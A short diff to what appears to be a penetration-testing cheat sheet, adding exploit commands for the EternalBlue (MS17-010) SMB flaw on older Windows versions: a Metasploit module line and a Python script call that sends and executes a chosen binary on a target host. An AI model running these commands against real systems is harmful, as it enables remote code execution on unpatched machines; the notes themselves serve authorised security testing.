@@ -346,6 +346,10 @@ vulnerability on Windows hosts:
 ```
 # Windows 7 and Server 2008 R2 (x64) All Service Packs
 msf> use exploit/windows/smb/ms17_010_eternalblue
+
+# Windows NT 5.0 / 5.1 / 5.2 (Windows 2000 / Windows XP & Windows Server 2003)
+# https://github.com/helviojunior/MS17-010
+python send_and_execute.py <HOSTNAME | IP> <BINARY>
 ```
 
 *SambaCry*
